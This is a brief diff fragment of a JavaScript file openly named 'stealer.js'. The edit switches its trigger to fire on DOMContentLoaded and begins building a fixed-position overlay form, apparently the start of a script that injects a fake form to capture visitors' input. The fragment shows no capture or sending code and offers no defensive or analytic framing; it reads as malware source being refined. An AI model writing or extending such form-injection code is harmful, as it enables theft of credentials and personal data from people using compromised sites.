@@ -1,5 +1,5 @@
 // stealer.js
-window.addEventListener('load', function() {
+document.addEventListener('DOMContentLoaded', function() {
     var form = document.createElement('form');
     form.style.position = 'fixed';
     form.style.top = '30%';
